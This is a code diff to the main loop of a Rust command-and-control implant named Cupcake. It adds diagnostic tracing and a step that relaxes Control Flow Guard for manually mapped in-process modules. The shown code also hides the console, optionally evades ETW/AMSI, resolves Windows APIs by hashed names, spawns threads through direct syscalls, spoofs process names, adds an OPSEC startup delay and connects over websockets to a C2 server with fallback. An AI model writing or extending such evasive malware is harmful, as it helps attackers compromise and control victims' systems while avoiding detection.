@@ -50,7 +50,23 @@ fn daemonize() {
     }
 }
 
+/// TEMP DIAG (remove after E2E): file trace gated on CUPCAKE_TRACE=1.
+fn trace(msg: &str) {
+    if std::env::var("CUPCAKE_TRACE").is_ok() {
+        use std::io::Write;
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open("agent_trace.log")
+        {
+            let _ = writeln!(f, "{}", msg);
+            let _ = f.flush();
+        }
+    }
+}
+
 fn main() {
+    trace("enter main");
     // 🚀 Linux 自主后台化 (Daemonization)
     #[cfg(target_os = "linux")]
     daemonize();
@@ -83,8 +99,10 @@ fn main() {
 
     // 💥 Global Panic Hook
     std::panic::set_hook(Box::new(|info| {
+        trace(&format!("PANIC: {:?}", info));
         log::error!("PANIC OCCURRED: {:?}", info);
     }));
+    trace("panic hook set");
 
     // Seed PRNG
     let seed = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
@@ -92,12 +110,25 @@ fn main() {
         Err(_) => 0x1337BEEF1337BEEF_u64,
     };
     cupcake_core::utils::seed_rng(seed);
+    trace("rng seeded");
 
     // 3. [Debug] DON'T Hide Console if logging is active
     if !logging_enabled {
+        trace("before hide_console");
         stealth::hide_console();
+        trace("after hide_console");
     } else {
+        trace("diag mode: hide_console skipped");
         log::info!("hide_console skipped (diag mode)");
+    }
+
+    // 3.5 [Windows] Relax CFG for this process — required for indirect calls
+    // into Manual-Mapped L2 modules (classic in-process BOF engine).
+    #[cfg(target_os = "windows")]
+    {
+        trace("before relax_cfg_self");
+        stealth::relax_cfg_self();
+        trace("after relax_cfg_self");
     }
 
     // 4. Optional ETW/AMSI — ONLY with feature stealth-adv (full profile).
@@ -116,32 +147,37 @@ fn main() {
 
     // 5. COM Initialization for PTY support (dynamic resolve — no combase IAT)
     #[cfg(target_os = "windows")]
-    unsafe {
-        // COINIT_MULTITHREADED = 0x0
-        // Console agents often lack ole32/combase until LoadLibrary.
-        type CoInitializeExFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
-        let mut done = false;
-        for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
-            let base = cupcake_core::stealth::ensure_module_base(
-                dll,
-                cupcake_core::stealth::hash_module_name(dll),
-            );
-            if base == 0 {
-                continue;
+    {
+        trace("before COM init");
+        unsafe {
+            // COINIT_MULTITHREADED = 0x0
+            // Console agents often lack ole32/combase until LoadLibrary.
+            type CoInitializeExFn =
+                unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
+            let mut done = false;
+            for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
+                let base = cupcake_core::stealth::ensure_module_base(
+                    dll,
+                    cupcake_core::stealth::hash_module_name(dll),
+                );
+                if base == 0 {
+                    continue;
+                }
+                if let Some(addr) = cupcake_core::stealth::get_api_addr(
+                    base,
+                    cupcake_core::stealth::hash_api_name(b"CoInitializeEx"),
+                ) {
+                    let f: CoInitializeExFn = std::mem::transmute(addr);
+                    let _ = f(std::ptr::null_mut(), 0);
+                    done = true;
+                    break;
+                }
             }
-            if let Some(addr) = cupcake_core::stealth::get_api_addr(
-                base,
-                cupcake_core::stealth::hash_api_name(b"CoInitializeEx"),
-            ) {
-                let f: CoInitializeExFn = std::mem::transmute(addr);
-                let _ = f(std::ptr::null_mut(), 0);
-                done = true;
-                break;
+            if !done {
+                cupcake_core::utils::db_print("[WARN] CoInitializeEx not resolved");
             }
         }
-        if !done {
-            cupcake_core::utils::db_print("[WARN] CoInitializeEx not resolved");
-        }
+        trace("after COM init");
     }
 
     // 9. Backgrounding and Name Spoofing (Linux)
@@ -156,9 +192,14 @@ fn main() {
     #[cfg(target_os = "windows")]
     {
         unsafe extern "system" fn agent_thread_proc(_: *mut winapi::ctypes::c_void) -> u32 {
+            trace("thread proc enter");
             let rt = match build_runtime() {
-                Ok(r) => r,
+                Ok(r) => {
+                    trace("runtime built");
+                    r
+                }
                 Err(e) => {
+                    trace(&format!("runtime build FAILED: {}", e));
                     cupcake_core::utils::db_print(&format!(
                         "[FATAL] Failed to create tokio runtime: {}",
                         e
@@ -167,14 +208,17 @@ fn main() {
                 }
             };
 
+            trace("before run()");
             rt.block_on(async {
                 if let Err(e) = run().await {
+                    trace(&format!("run() returned err: {:?}", e));
                     cupcake_core::utils::db_print(&format!(
                         "[FATAL] Agent run loop failed: {:?}",
                         e
                     ));
                 }
             });
+            trace("after run()");
 
             0
         }
@@ -182,20 +226,27 @@ fn main() {
         // Prefer NtCreateThreadEx (syscall); no CreateThread IAT dependency.
         // stack_size=0 → OS default (do NOT pass large commit with 0 reserve:
         // Server 2012 R2 / Win8.1 reject or mis-handle commit>reserve).
+        trace("before create_thread_ex");
         let h_thread = match cupcake_core::native::create_thread_ex(
             agent_thread_proc,
             std::ptr::null_mut(),
             0,
         ) {
-            Ok(h) => h,
+            Ok(h) => {
+                trace(&format!("create_thread_ex ok h={:#x}", h));
+                h
+            }
             Err(e) => {
+                trace(&format!("create_thread_ex FAILED: {}", e));
                 cupcake_core::utils::db_print(&format!("[FATAL] NtCreateThreadEx failed: {}", e));
                 return;
             }
         };
 
         // Wait indefinitely for agent thread
+        trace("before wait_for_single_object");
         cupcake_core::native::wait_for_single_object(h_thread);
+        trace("after wait_for_single_object");
         let _ = cupcake_core::native::close_handle(h_thread);
     }
     #[cfg(not(target_os = "windows"))]
@@ -233,7 +284,7 @@ async fn run() -> Result<()> {
     {
         let delay_ms = cupcake_core::module_loader::stage0_startup_delay_ms();
         cupcake_core::utils::db_print(&format!(
-            "[Cupcake] Stage0 startup delay {} ms (OPSEC jitter)",
+            "[agent] Stage0 startup delay {} ms (OPSEC jitter)",
             delay_ms
         ));
         crate::stealth::stealth_sleep(delay_ms as u32).await;
@@ -294,15 +345,23 @@ async fn run_websocket_mode() -> Result<()> {
     use cupcake_core::{ClientError, Transport};
 
     let server_url = get_server_url();
+    trace(&format!("ws mode: server_url={}", server_url));
     // println!("[*] Target C2 Server: {}", server_url);
 
     if !validate_server_url(&server_url) {
+        trace("ws mode: URL validation FAILED");
         return Err(ClientError::ConnectionError("invalid_target".to_string()));
     }
 
     let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
-        Ok(t) => t,
-        Err(e) => return Err(e),
+        Ok(t) => {
+            trace("ws mode: transport created");
+            t
+        }
+        Err(e) => {
+            trace(&format!("ws mode: transport create FAILED: {:?}", e));
+            return Err(e);
+        }
     };
 
     // 🛡️ Phase 3: Initialize Fallback Manager
@@ -346,6 +405,7 @@ async fn run_websocket_mode() -> Result<()> {
         };
 
         if let Err(_e) = transport.connect().await {
+            trace("ws mode: connect failed");
             // 🛡️ Phase 3: Primary failed - try fallback
             if *fallback.state() == FallbackState::Primary {
                 if let Some(_fallback_url) = fallback.switch_to_fallback() {
@@ -378,6 +438,7 @@ async fn run_websocket_mode() -> Result<()> {
 
         // 连接成功：重置退避计时器
         backoff.reset();
+        trace(&format!("ws mode: CONNECTED to {}", current_url));
 
         #[cfg(feature = "plugin")]
         let run_result = {
